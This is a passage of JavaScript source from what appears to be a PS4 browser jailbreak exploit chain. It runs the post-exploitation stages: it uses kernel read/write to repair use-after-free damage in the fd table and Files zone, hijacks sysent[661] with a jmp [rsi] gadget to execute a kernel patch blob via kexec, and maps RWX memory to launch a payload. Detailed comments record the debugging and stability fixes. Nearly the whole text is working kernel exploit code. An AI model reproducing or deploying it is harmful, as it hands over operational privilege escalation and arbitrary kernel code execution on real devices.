                        if (!now || (now.low >>> 0) !== 0 || (now.hi >>> 0) !== 0) {
                            mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts
                                + " was=" + was + " still=" + now);
                            return "writefail";
                        }
                        return was && ((was.low >>> 0) || (was.hi >>> 0))
                            ? "nulled" : "already0";
                    }
                    {
                        const res = triplets.map(fd => fd + ":" + removeRthdrFromSocket(fd));
                        mark("TRIPLET-RTHDR", res.join(" "));

                        /*
                        "already0" is a success: the field was already clear,
                        so there is nothing to repair. Only a failed WRITE or
                        a bad walk is a failure -- and unlike before, this now
                        reflects a verified read-back rather than the shape of
                        the pointers we walked to get here.
                        */
                        check("triplet-ip6po_rthdr-nulled",
                            res.every(r => r.endsWith("nulled")
                                || r.endsWith("already0")),
                            res.join(" "));
                    }

                    /*
                    ITEM 6(c). The half that makes the retry safe. Every socket
                    burned during a failed attempt still has an rthdr pointing
                    at a freed ucred; closing it would free that chunk again.
                    Now that kernel R/W exists, null the pointer -- verified by
                    read-back -- and only then let it out of the burn list.
                    Anything that will not repair STAYS burned and stays open.
                    */
                    if (burned.size) {
                        const bres = [], cleared = [];
                        for (const fd of burned) {
                            const r = removeRthdrFromSocket(fd);
                            bres.push(fd + ":" + r);
                            if (r === "nulled" || r === "already0") cleared.push(fd);
                        }
                        for (const fd of cleared) burned.delete(fd);
                        mark("BURNED-REPAIRED", bres.join(" ")
                            + "  still_burned=" + burned.size);
                        check("burned-sockets-repaired", burned.size === 0,
                            burned.size ? [...burned].join(",") : "");
                        if (burned.size) {
                            rebootRequired = true;
                            rebootReason = "burned-sockets-unrepaired count=" + burned.size;
                        }
                    }

                    state("remove_uaf_file...", "warn");
                    const uafFp = fget(uafSock);
                    uafFpSaved = uafFp;
                    mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
                    if (kptr2(uafFp)) {

                        const r = await fhold(uafFp);

                        /*
                        THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
                        2048 x fget(), and every fget minted TWO int64 -- and
                        int64.js gives each instance its own seven closures
                        (int64.js:19-93), so 8 GC cells apiece -- plus a
                        per-call Uint8Array inside kv.read8, plus two pipe
                        syscalls. 34,816 objects and 4,096 syscalls in one
                        unbroken synchronous stretch, at the point the heap is
                        most loaded, with no yield anywhere in it. JSC's
                        sweeper only runs when the event loop turns, so all of
                        that garbage sat unswept until the await immediately
                        after SOCKETS-CLOSED -- which is exactly where the
                        process was being killed.

                        Same range, same comparisons, same writes. The ofiles
                        array is just read in bulk and scanned as raw words in
                        the DataView: no int64, no typed array, no per-fd
                        syscall. Two syscalls per 512 fds instead of 1024.
                        Cleanup runs ~500 ms after the race, so the yields are
                        free here.
                        BOUNDED. This scan used to run to 0x800 with nothing
                        proving the ofiles array is that big. If the table is
                        smaller, the bulk read walks past the allocation and
                        any 8 bytes out there that happen to equal uafFp get
                        ZEROED by the fput below -- an out-of-bounds kernel
                        write whose damage surfaces at the NEXT allocation,
                        which is exactly the window where 22% of the runs
                        reaching here died. POOPS.LUA:1219 scans only 0..255;
                        we were eight times wider with no bound at all.

                        Bound it by the highest fd we can PROVE is open,
                        because we are holding it -- the table must have at
                        least that many entries, and FreeBSD never shrinks it
                        on close. No fd_nfiles offset to get wrong. The
                        highest alias ever observed across 71 logged runs is
                        273, and our own sockets run past that.
                        */
                        let maxHeld = 0;
                        for (const fd of ipv6) if (fd > maxHeld) maxHeld = fd;
                        for (const fd of [masterPipe[0], masterPipe[1],
                        slavePipe[0], slavePipe[1],
                        iovSs[0], iovSs[1], uioSs[0], uioSs[1],
                            uafSock])
                            if (fd > maxHeld) maxHeld = fd;
                        const SCAN_MAX = Math.min(0x800, maxHeld + 1);
                        mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld
                            + " scan_max=" + SCAN_MAX + " was=2048");

                        /*
                        CLAMPED, and it has to be. This value is the loop
                        INCREMENT at the bottom of this block, not a bound, so
                        unlike every other knob in this file a bad value does
                        not degrade to "do nothing" -- it never terminates.
                        parseInt("0x200", 10) is 0 (it stops at the x), and
                        0x200 is exactly how the default is spelled right
                        here, so that is the value someone is most likely to
                        paste in. A non-terminating loop here awaits a 0 ms
                        timer forever: the finally never runs, the main thread
                        stays realtime-pinned, the freed file stays aliased,
                        and the console needs a hard power-off.
                        Upper bound: CHUNK_BYTES must stay strictly under
                        PIPE_PAGE, or pipe_read wraps its buffer and hands
                        back DUPLICATED data that still passes the
                        rv === CHUNK_BYTES check -- which would make fput()
                        write zeros far past the end of the fd table.
                        */
                        const CHUNK_FDS = (function () {
                            const cap = (PIPE_PAGE / FILEDESCENT_SIZE) >> 1;
                            const n = params.has("scanchunk")
                                ? parseInt(params.get("scanchunk"), 10) : 0x200;
                            if ((n | 0) === n && n >= 1 && n <= cap) return n;
                            if (params.has("scanchunk"))
                                mark("SCANCHUNK-CLAMPED", "given="
                                    + params.get("scanchunk") + " cap=" + cap
                                    + " using=0x200");
                            return 0x200;
                        })();
                        const CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
                        const scanAb = new ArrayBuffer(CHUNK_BYTES);
                        keepAlive.push(scanAb);   // its address goes to the kernel
                        const scanAddr = bufAddr(scanAb);
                        const scanDv = new DataView(scanAb);
                        const wantLo = uafFp.low >>> 0, wantHi = uafFp.hi >>> 0;
                        let nulled = 0, bulkChunks = 0, slowChunks = 0;
                        const fds = [];
                        for (let base = 0; base < SCAN_MAX; base += CHUNK_FDS) {
                            await breathe();

                            /*
                            Clamp the LAST chunk. SCAN_MAX is now a measured
                            bound, not a round number, so a fixed-size read
                            here would walk past the table on the final chunk
                            -- reintroducing the exact out-of-bounds this
                            bound exists to prevent.
                            */
                            const nFds = Math.min(CHUNK_FDS, SCAN_MAX - base);
                            const nBytes = nFds * FILEDESCENT_SIZE;
                            const rv = kv.kread(scanAddr,
                                fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                nBytes);
                            if (rv === nBytes) {
                                bulkChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const o = i * FILEDESCENT_SIZE;
                                    if (scanDv.getUint32(o, true) === wantLo
                                        && scanDv.getUint32(o + 4, true) === wantHi) {
                                        const fd = base + i;
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            } else {

                                /*
                                Short read: redo THIS CHUNK the original way.
                                Never skip one -- a missed alias leaves the
                                console dirty and costs a reboot, which is far
                                worse than the allocation we are avoiding.
                                */
                                slowChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const fd = base + i;
                                    if (same(fget(fd), uafFp)) {
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            }

                            // Let the sweeper run. This is the whole point.
                            await new Promise(done => setTimeout(done, 0));
                        }
                        mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk="
                            + bulkChunks + " fellback=" + slowChunks
                            + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
                        uafSock = 0;

                        /*
                        P1: DRAIN THE FILE ZONE
                        MEASURED, not assumed. A 256-allocation probe returned
                        the SAME struct file at three consecutive fds
                        (364,365,366): the chunk is linked into the Files zone
                        free list THREE times -- freed 3x (CLEAR_QUEUE and two
                        dup+close) but allocated once -- so falloc hands the
                        identical object to three independent owners. The first
                        to close it frees it; the other two dangle. That is the
                        panic minutes after an idle run.

                        The fd-table scan above cannot see this: a free-list
                        entry is in no fd table. Pull the duplicates out by
                        allocating until they surface (~1032 deep, stride 0x68).

                        NULL the slot; do NOT leak the fd. f_count reads 1, not
                        3 -- each falloc resets it -- so three descriptors point
                        at an object whose refcount says one, and leaking them
                        only moves the panic to fdescfree at process exit.
                        Nulling means nothing references it and it is orphaned
                        for good. netctrl_c0w_twins.ts:1332 nulls before close
                        for exactly this reason.
                        */
                        /*
                        KERNEL MEMORY. This loop opens live AF_UNIX sockets --
                        each one a struct socket + struct file + unpcb + its
                        buffers, all kernel heap that does NOT show up in the
                        WebProcess "2.00GB/2.28GB" counter. On close() FreeBSD
                        moves them to the zone free lists rather than back to
                        the system, so a big drain leaves the console low on
                        free system memory and the NEXT allocating stage dies
                        with "There is not enough free system memory."

                        That is exactly what a 1536-socket drain produced: the
                        repair reported clean (found 1, nulled 1, residual 0)
                        and then the run died right after
                        restoreThreadAttrs("cleanup"), with no stage mark in
                        between. 1536 was never a measurement -- it came from
                        one observation of a duplicate ~1032 deep -- and it is
                        paid in full even when the very first batch finds
                        everything.

                        Two changes, both bounded by the same reasoning:

                          1. DRAIN_CAP default 1536 -> 384. The observed
                             duplicate depth is ~1032 for the FIRST duplicate,
                             but the duplicate only has to be reached once and
                             the zone is walked in 128-socket batches, so 384
                             covers three full batches. ?drain= raises it.

                          2. EARLY EXIT once a hit lands. Waiting for
                             DRAIN_EXPECT hits (or the cap, or 15 s) means a
                             run that finds one duplicate at batch 1 still
                             opens the whole budget. Stopping after the first
                             hit turns that into 128 sockets instead of 384.
                             The verification below (freed-file-not-reissued-
                             by-falloc) is what proves the drain actually
                             worked, so a smaller drain that still verifies is
                             strictly better than a large one that OOMs.
                        */
                        const DRAIN_CAP = (function () {
                            const n = params.has("drain")
                                ? parseInt(params.get("drain"), 10) : 384;
                            return ((n | 0) === n && n >= 0 && n <= 8192) ? n : 384;
                        })();
                        /*
                        Stop as soon as ANY duplicate is found. Overridable
                        with ?drainexpect= for a run that wants to keep
                        hunting (e.g. to confirm there really are 3).
                        */
                        const DRAIN_EXPECT = params.has("drainexpect")
                            ? Math.max(1, parseInt(params.get("drainexpect"), 10) || 1)
                            : 1;
                        const DRAIN_BATCH = 128;

                        /*
                        Visible to the `clean` decision below. Default true so
                        that ?drain=0 does not by itself condemn the run.
                        */
                        let zoneClean = true;
                        if (DRAIN_CAP > 0) {
                            const dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
                            keepAlive.push(dAb);
                            const dAddr = bufAddr(dAb), dDv = new DataView(dAb);
                            const oneAb = new ArrayBuffer(8); keepAlive.push(oneAb);
                            const oneAddr = bufAddr(oneAb), oneDv = new DataView(oneAb);
                            const wLo = uafFp.low >>> 0, wHi = uafFp.hi >>> 0;
                            const held = [], hitFds = [];
                            let scanned = 0, batches = 0, moved = 0, emfile = false;
                            /* Which exit ended the drain: found | cap | timeout
                               | emfile | exhausted. Reported at ZONE-DRAIN. */
                            let stopWhy = "";

                            /*
                            The fd table REALLOCATES as it grows, so the cached
                            fdtOfiles goes stale mid-drain and both fget and fput
                            would then touch freed memory. Re-read it each batch
                            and use the fresh pointer for reads AND writes.
                            */
                            let ofl = fdtOfiles;
                            const dl = Date.now() + 15000;
                            while (scanned < DRAIN_CAP && hitFds.length < DRAIN_EXPECT
                                && Date.now() < dl) {
                                const batch = [];
                                for (let i = 0; i < DRAIN_BATCH && scanned < DRAIN_CAP; ++i) {
                                    /* Open in small slices with an event-loop
                                       yield between them. DRAIN_BATCH is 128
                                       sockets, each a synchronous ROP socket()
                                       -- one unbroken stretch long enough for
                                       the watchdog on its own. */
                                    if ((i & 0xf) === 0xf) await breathe();
                                    const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                    if (fd === -1) { emfile = true; break; }
                                    batch.push(fd); held.push(fd); scanned++;
                                }
                                if (!batch.length) break;
                                batches++;
                                const fresh = kv.read8(kqFdp);
                                if (kptr2(fresh) && !(fresh.low === ofl.low
                                    && fresh.hi === ofl.hi)) {
                                    ofl = fresh; moved++;
                                }
                                const lo = batch[0], hi = batch[batch.length - 1];
                                const span = (hi - lo + 1) * FILEDESCENT_SIZE;
                                let bulk = false;
                                if (span > 0 && span <= dAb.byteLength) {
                                    bulk = kv.kread(dAddr,
                                        ofl.add32(lo * FILEDESCENT_SIZE), span) === span;
                                }
                                for (const fd of batch) {
                                    let flo, fhi;
                                    if (bulk) {
                                        const o = (fd - lo) * FILEDESCENT_SIZE;
                                        flo = dDv.getUint32(o, true) >>> 0;
                                        fhi = dDv.getUint32(o + 4, true) >>> 0;
                                    } else {
                                        if (kv.kread(oneAddr,
                                            ofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8)
                                            continue;
                                        flo = oneDv.getUint32(0, true) >>> 0;
                                        fhi = oneDv.getUint32(4, true) >>> 0;
                                    }
                                    if (flo === wLo && fhi === wHi) hitFds.push(fd);
                                }
                                /*
                                STOP THE MOMENT WE HAVE WHAT WE CAME FOR.
                                The while-condition above is re-checked here,
                                so a first-batch hit exits without opening
                                another 128 sockets. `why` records which of
                                the three exits fired, because the old mark
                                could not tell a cap-stop from an
                                expect-stop from a timeout -- which is what
                                made the 1536-socket drain invisible.
                                */
                                if (hitFds.length >= DRAIN_EXPECT) {
                                    stopWhy = "found";
                                    break;
                                }
                                await new Promise(done => setTimeout(done, 0));
                            }
                            if (!stopWhy)
                                stopWhy = (emfile ? "emfile"
                                    : Date.now() >= dl ? "timeout"
                                        : scanned >= DRAIN_CAP ? "cap" : "exhausted");

                            /*
                            NULL every hit through the CURRENT ofiles, then close.
                            close() on a nulled slot is a no-op, so nothing frees.
                            */
                            let nulledHits = 0;
                            for (const fd of hitFds) {
                                oneDv.setUint32(0, 0, true); oneDv.setUint32(4, 0, true);
                                kv.kwrite(ofl.add32(fd * FILEDESCENT_SIZE), oneAddr, 8);
                                if (kv.kread(oneAddr,
                                    ofl.add32(fd * FILEDESCENT_SIZE), 8) === 8
                                    && oneDv.getUint32(0, true) === 0
                                    && oneDv.getUint32(4, true) === 0) nulledHits++;
                                sc(SYS.close, fd);
                            }
                            /* Close up to DRAIN_CAP fds, each a synchronous
                               ROP close(), with a wall-clock yield so the
                               batch cannot outrun the watchdog. */
                            let hci = 0;
                            for (const fd of held) {
                                if ((++hci & 0xf) === 0xf) await breathe();
                                if (hitFds.indexOf(fd) < 0) sc(SYS.close, fd);
                            }
                            mark("ZONE-DRAIN", "scanned=" + scanned + "/" + DRAIN_CAP
                                + " batches=" + batches
                                + " hits=" + hitFds.length + "/" + DRAIN_EXPECT
                                + (hitFds.length ? " at_fds=" + hitFds.join(",") : "")
                                + " nulled=" + nulledHits
                                + " ofiles_moved=" + moved
                                + " why=" + stopWhy
                                + (emfile ? " EMFILE" : ""));
                            /*
                            THE GATE IS "EVERY HIT NULLED", NOT "FOUND EXACTLY N".

                            A count of 3 came from ONE probe (fds 364/365/366):
                            the chunk had been freed into the Files zone three
                            times on that run. That is an OBSERVATION, not an
                            invariant -- how many times the chunk lands on the
                            zone free list depends on which dup/close/
                            CLEAR_QUEUE operations actually landed. This run
                            found 1 and the repair was still complete.

                            Requiring an exact count turns "this run freed the
                            chunk a different number of times" into "the kernel
                            is dirty": zoneClean goes false, reboot=1, and a
                            fully successful run reports Partial success. That
                            is the false reboot flag -- and fdtable=ok nulled=1
                            in the same summary line is the proof the repair
                            itself worked.

                            What actually matters is that nothing found is left
                            dangling (nulledHits === hitFds.length) and that
                            fresh allocations can no longer get the chunk --
                            which is measured independently below by
                            freed-file-not-reissued-by-falloc. The count is
                            reported, not asserted.
                            */
                            check("file-zone-duplicates-drained",
                                nulledHits === hitFds.length,
                                "found " + hitFds.length + " (expect " + DRAIN_EXPECT
                                + "), nulled " + nulledHits);
                            if (nulledHits !== hitFds.length) {
                                rebootRequired = true; zoneClean = false;
                            }

                            /*
                            Independent verification: fresh allocations must no
                            longer be handed the chunk. This is the measurement
                            that says the console is actually clean.
                            */
                            const vfds = [];
                            let vhits = 0;
                            for (let i = 0; i < 16; ++i) {
                                await breathe();
                                const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                if (fd === -1) break;
                                vfds.push(fd);
                            }
                            const vres = kv.read8(kqFdp);
                            const vofl = kptr2(vres) ? vres : ofl;
                            for (const fd of vfds) {
                                if (kv.kread(oneAddr,
                                    vofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8) {
                                    sc(SYS.close, fd); continue;
                                }
                                if ((oneDv.getUint32(0, true) >>> 0) === wLo
                                    && (oneDv.getUint32(4, true) >>> 0) === wHi) {
                                    vhits++;
                                    oneDv.setUint32(0, 0, true);
                                    oneDv.setUint32(4, 0, true);
                                    kv.kwrite(vofl.add32(fd * FILEDESCENT_SIZE),
                                        oneAddr, 8);
                                }
                                sc(SYS.close, fd);
                            }
                            mark("ZONE-VERIFY", "alloc=" + vfds.length
                                + " residual_hits=" + vhits);
                            check("freed-file-not-reissued-by-falloc", vhits === 0,
                                vhits ? "still reissued after the drain" : "");
                            if (vhits) { rebootRequired = true; zoneClean = false; }
                        }


                        //END P1: DRAIN THE FILE ZONE
                        mark("UAF-REMOVED", "fhold=" + r.before + "->" + r.after
                            + " nulled=" + nulled + "/" + SCAN_MAX
                            + " fds=" + fds.join(","));

                        /*
                        `nulled > 0` only ever proved the LIVE FD TABLE was
                        tidy. It is structurally blind to a free-list entry,
                        and every "clean" run we celebrated was reporting on
                        that blind evidence -- which is why the console kept
                        panicking minutes later. A run is clean only if the fd
                        table was repaired AND the zone drain removed every
                        duplicate AND fresh allocations no longer see it.
                        */
                        check("alias-freed-file-nulled",
                            nulled > 0, "nulled=" + nulled);
                        const clean = nulled > 0 && zoneClean;
                        if (clean) {
                            rebootRequired = false;
                            rebootReason = "none";
                        } else {
                            rebootReason = "fdtable="
                                + (nulled > 0 ? "ok" : "FAILED")
                                + " zone=" + (zoneClean ? "ok" : "FAILED")
                                + " nulled=" + nulled;
                            mark("STILL-DIRTY", "reboot=1 " + rebootReason);
                        }
                    } else {
                        check("uaf_sock-struct-file-readable", false,
                            "fp=" + uafFp);
                    }

                    {
                        /*
                        WATCHDOG. 256 synchronous sc(close) here -- the mirror
                        of the socket-creation loop, and it runs on every run,
                        successful or not. breathe() per iteration bounds it.
                        */
                        let closed = 0, heldBack = 0;
                        for (const fd of ipv6) {
                            await breathe();

                            /*
                            ITEM 6(c). A still-burned socket owns an rthdr over
                            freed memory; close() would free it a second time.
                            Leaking the fd costs nothing, freeing it panics.
                            */
                            if (burned.has(fd)) { heldBack++; continue; }
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        }
                        for (const fd of [iovSs[0], iovSs[1], uioSs[0], uioSs[1]]) {
                            await breathe();
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        }
                        mark("SOCKETS-CLOSED", "n=" + closed + "/" + (ipv6.length + 4)
                            + (heldBack ? "  held_back_burned=" + heldBack : ""));
                    }

                    await restoreThreadAttrs("cleanup");


                    let kpatched = false;
                    if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                        state("kernel patches...", "warn");
                        const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                        const sysent = kernelBase.add32(off.k_sysent_661);
                        const gadget = kernelBase.add32(off.k_jmp_rsi);
                        const gb = [];
                        for (let i = 0; i < 4; ++i) {
                            new Uint8Array(kvwAb).fill(0);
                            kv.kread(kvwAddr, gadget.add32(i), 1);
                            gb.push(kvwDv.getUint8(0));
                        }
                        mark("JMP-RSI-BYTES", gadget + " -> " + hexBytes(gb));

                        const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
                        const oNarg = kview(sysent).getInt32(SYSENT_NARG);
                        const oCall = kview(sysent).getBInt(SYSENT_CALL);
                        const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
                        mark("SYSENT-661", "narg=" + oNarg + " thrcnt=" + oThr
                            + " sy_call=" + oCall);
                        const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);

                        const siteBytes = [];
                        let sitesOk = true;
                        for (const s of KPATCH_JMP_SITES) {
                            new Uint8Array(kvwAb).fill(0);
                            kv.kread(kvwAddr, kernelBase.add32(s), 1);
                            const b = kvwDv.getUint8(0);
                            siteBytes.push(hx(s) + ":" + b.toString(16));
                            if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false;
                        }
                        mark("KPATCH-SITES", siteBytes.join(" "));
                        check("gadget-sysent661-patch-sites-look-right",
                            gadgetOk && sysentOk && sitesOk,
                            "gadget=" + gadgetOk + " sysent=" + sysentOk
                            + " sites=" + sitesOk);
                        if (gadgetOk && sysentOk && sitesOk) {
                            const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
                            const KEXEC_MAP = new int64(0x20100000, 9);
                            const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7,
                                0x11, jitFd, 0);
                            const mapAddr = new int64(mapped.lo, mapped.hi);
                            mark("KPATCH-MAP", "jitshm_create=" + jitFd
                                + " mmap=" + mapAddr);
                            if (mapAddr.hi > 0) {
                                /*
                                WATCHDOG. kpatch.length is the whole blob, and
                                this is TWO full passes over it -- one p.write1
                                per byte, then one p.read1 per byte -- with no
                                yield anywhere.
                                */
                                /*
                                Chunked for the same reason as the payload copy
                                below: `await breathe()` per 256 bytes is a
                                microtask round-trip per 256 bytes, and the
                                cost of the await dominates the byte work once
                                the loop is longer than a few thousand. Await
                                once per 0x4000-byte chunk.
                                */
                                const KCHUNK = 0x4000;
                                for (let i = 0; i < kpatch.length; i += KCHUNK) {
                                    await breathe();
                                    const end = Math.min(i + KCHUNK, kpatch.length);
                                    for (let j = i; j < end; ++j)
                                        p.write1(mapAddr.add32(j), kpatch[j]);
                                }
                                let copied = true;
                                for (let i = 0; i < kpatch.length; i += KCHUNK) {
                                    await breathe();
                                    const end = Math.min(i + KCHUNK, kpatch.length);
                                    for (let j = i; j < end; ++j)
                                        if (p.read1(mapAddr.add32(j)) !== kpatch[j]) { copied = false; break; }
                                    if (!copied) break;
                                }
                                check("blob-rwx-memory-byte-byte",
                                    copied, kpatch.length + " bytes");
                                if (copied) {
                                    kview(sysent).setInt32(SYSENT_NARG, 2);
                                    kview(sysent).setBInt(SYSENT_CALL, gadget);
                                    kview(sysent).setInt32(SYSENT_THRCNT, 1);
                                    const armedOk = same(kview(sysent).getBInt(SYSENT_CALL), gadget);
                                    mark("SYSENT-ARMED", "sy_call=" + gadget
                                        + (armedOk ? "" : " MISMATCH"));
                                    if (armedOk) {

                                        /*
                                        ITEM 5b. sysent[661] is now pointing at
                                        a jmp [rsi] gadget SYSTEM-WIDE. If
                                        anything between here and the restore
                                        throws, every process on the console is
                                        left with a weaponised syscall 661 --
                                        and the outer finally does not cover
                                        this, because it is nested inside the
                                        KernelView block. Restore in a finally.
                                        */
                                        let rc = -1;
                                        try {
                                            rc = sc(SYS.kexec, mapAddr).i32;
                                        } finally {
                                            kview(sysent).setInt32(SYSENT_NARG, oNarg);
                                            kview(sysent).setBInt(SYSENT_CALL, oCall);
                                            kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                                            const back = same(
                                                kview(sysent).getBInt(SYSENT_CALL), oCall);
                                            if (!back) mark("SYSENT-NOT-RESTORED",
                                                "sy_call still " +
                                                kview(sysent).getBInt(SYSENT_CALL)
                                                + " -- syscall 661 is armed system-wide");
                                        }
                                        const verify = [];
                                        let allEb = true;
                                        for (const s of KPATCH_JMP_SITES) {
                                            new Uint8Array(kvwAb).fill(0);
                                            kv.kread(kvwAddr, kernelBase.add32(s), 1);
                                            const b = kvwDv.getUint8(0);
                                            verify.push(hx(s) + ":" + b.toString(16));
                                            if (b !== 0xeb) allEb = false;
                                        }
                                        mark("KEXEC", "arg=" + mapAddr + " rc=" + rc
                                            + " sysent=restored");
                                        mark("KPATCH-VERIFY", verify.join(" "));
                                        kpatched = rc === 0 && allEb;
                                        check("gated-site-reads-0xeb",
                                            allEb, "");
                                        check("blob-ran-ring-0", rc === 0,
                                            "kexec=" + rc);
                                        if (kpatched) mark("KERNEL-PATCHED",
                                            "sites=" + KPATCH_JMP_SITES.length);
                                    }
                                }
                            }
                        }
                    } else if (jailbroken) {
                        mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0)
                            + " sites=" + KPATCH_JMP_SITES.length);
                    }

                    /*
                    SHARED RESOLVER (post-exploit.js) -- same one lapse.js
                    calls. The private copy that used to live here has been
                    removed: netctrl and lapse had drifted apart on it, and
                    post-exploit.js exists precisely so they cannot.

                    WHY THE FALLBACK IS CORRECT ON 10.00-11.02, and this is
                    not a gap to be filled in:

                      Firmware          WebKit        pthread resolution
                      10.00, 10.50      Safari 15.4   fallback heuristics
                      11.00, 11.02      Safari 15.4   fallback heuristics
                      11.50 - 13.00     Safari 17.0   wk___imp_pthread_create
                                                  + k_pthread_create rows
                    The offsets table reflects that deliberately: the two
                    pthread keys exist only from 11.50 up, and offsets.js:47
                    records that 10.00-11.02 share one JSC layout ("same
                    WebKit (Safari 15.4) gen as verified 10.00-11.02"). The
                    15.4 and 17.0 builds locate pthread_create through
                    different tables, so on 15.4 the byte fallback IS the
                    intended route -- which is exactly why the shared resolver
                    tries the heuristics FIRST and lets the table override
                    them only when a row exists.

                    What each chain keeps for itself, per post-exploit.js:
                    netctrl does not wrap the result in check() (lapse does),
                    and it applies ?forcepthread=1 AFTER reading the result,
                    using `cand`. Both are preserved below.
                    */
                    function resolvePthread() {
                        const resolved = resolvePthreadCreate({
                            p: p, webkitBase: webkitBase,
                            libkernelBase: libkernelBase,
                            offsets: off, mark: mark
                        });
                        mark("PTHREAD-TARGET", resolved.target
                            ? resolved.how + " -> " + resolved.target
                            : "not resolved");
                        return resolved;
                    }

                    let payloadRunning = false;
                    if (payload && (kpatched || params.get("payload") === "1")
                        && params.get("payload") !== "0") {
                        /*
                        DRAIN THE SWEEPER BEFORE ALLOCATING AGAIN.

                        The crash this guards is "There is not enough free
                        system memory" reported immediately after
                        PTHREAD-TARGET -- i.e. at the ArrayBuffer(8) below, the
                        first allocation after the resolver. That is not the
                        launch failing; it is the process already being at its
                        limiter when it gets there.

                        Everything up to this point has deliberately churned
                        memory: the UAF zone drain opened and closed hundreds of
                        sockets (kernel zones, which FreeBSD does NOT hand back
                        to the system on close), and remove_uaf_file's fd scan
                        plus the kqueue loop allocated hard in the WebProcess.
                        JSC's sweeper only runs when the event loop turns, so
                        all of that garbage is still resident at this line.

                        A few real event-loop turns here costs a handful of
                        milliseconds and gives the sweeper the window it has
                        not had since the race. This is the same lever the
                        ?pair=1 sweep uses earlier in the run, applied at the
                        point that actually dies.
                        */
                        for (let settle = 0; settle < 8; ++settle)
                            await new Promise(r => setTimeout(r, 0));
                        state("payload...", "warn");
                        const sz = (payload.length + 0x3fff) & ~0x3fff;
                        const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                        const entry = new int64(m.lo, m.hi);
                        /*
                        The copy below is address arithmetic, not int64
                        arithmetic: entry is canonical, so its numeric value is
                        exact in a double and cheap to advance. One int64 is
                        minted per SPAN instead of per byte.
                        */
                        entry.num = entry.hi * (2 ** 32) + entry.low;
                        /*
                        `entry.hi > 0` WAS THE PAYLOAD BUG.

                        This guard used to be the ONLY thing gating the whole
                        copy-and-launch block. It is wrong: on PS4 userland an
                        ANONYMOUS mmap(0, ...) for the payload routinely lands
                        at a LOW address whose high 32 bits are 0, so entry.hi
                        is 0 while the mapping is perfectly valid. The guard
                        then silently skipped every stage below it --
                        PAYLOAD-AIM, PAYLOAD-COPY, PTHREAD-TARGET,
                        PTHREAD-CREATE -- leaving payloadRunning=false and
                        ending the run "Partial success" with jb/kpatch fine
                        and payload=false. That is exactly this log.

                        lapse validates the same mapping correctly
                        (lapse.js:3509-3510): the mmap FAILED if the return is
                        -1 (m.i32 === -1) or the mapping is the null address
                        {low:0,hi:0}. A high-word test is not a validity test;
                        it is a coincidence that held on whatever address the
                        earlier runs happened to get.
                        */
                        const entryOk = m.i32 !== -1
                            && !(entry.low === 0 && entry.hi === 0);
                        mark("PAYLOAD-MAP", "size=0x" + sz.toString(16)
                            + " rwx=" + entry + " i32=" + m.i32
                            + " ok=" + entryOk);
                        check("payload-mapped-anon-rwx", entryOk,
                            entryOk ? "" : "mmap(0,0x" + sz.toString(16)
                                + ",rwx,PRIVATE|ANON) -> " + entry);
                        if (!entryOk)
                            mark("PAYLOAD-MAP-FAILED", "mmap returned " + entry
                                + " i32=" + m.i32 + " -- nothing below can run");
                        if (entryOk) {
                            /*
                            THIS STAGE WAS CHOPPY BECAUSE OF THE ACCESSOR, NOT
                            THE CHUNK SIZE.

                            The chunk is already 0x4000 rather than 0x100 for
                            the reason spelled out below -- awaiting breathe()
                            per 256 bytes is 580 000 microtask hops over both
                            passes. 16 awaits per pass fixes the await.

                            What it does not fix is what is INSIDE the chunk.
                            `p` is the carrier, and every single access is a
                            three-step dance in mem.js:

                              aimFor()  -> addrNumber() -> toI64()  (which
                                           THROWS a fresh int64 at every
                                           call site that did not already
                                           hold one)
                                       -> carrier.aim() -> aimCarrier()
                                       -> a LOOP OF 8 indexed Uint8Array
                                          stores to relocate the window
                              carrier.view[0]         (the actual byte)
                              carrier.restore() -> restoreCarrier()
                                       -> a LOOP OF 8 indexed Uint8Array
                                          stores to put the window back
                            That is 8 + 8 + ~3 closure-allocating calls around
                            ONE byte, and it is paid per byte, TWICE -- once
                            writing and once reading back -- for ~290 000
                            bytes. ~580 000 window re-aims, ~9 300 000 indexed
                            byte stores, and ~1 700 000 short-lived int64
                            objects (each of which gives itself seven closures
                            in int64.js:19-93, so ~12 000 000 GC cells) in one
                            unbroken stretch. That is the chop: the allocator
                            and the sweeper working harder than the copy, and
                            the elapsed time varying run to run with heap state
                            rather than with the payload size.

                            It is also unsafe, not just slow. windowBytes is
                            0x100 (core.js:54) and aimFor() throws on anything
                            larger, so the obvious "read it 4 bytes at a time"
                            is out. But NOTHING stops a read4 from starting at
                            window-relative 0xfe and ending at 0x101. Read the
                            window once per span and index it in JS instead:
                            one aim, at most THIRTY-TWO int64 allocations, and
                            the byte loop becomes pure Uint8Array indexing.

                            MAIN_ONLY is deliberate: p is the MAIN thread's
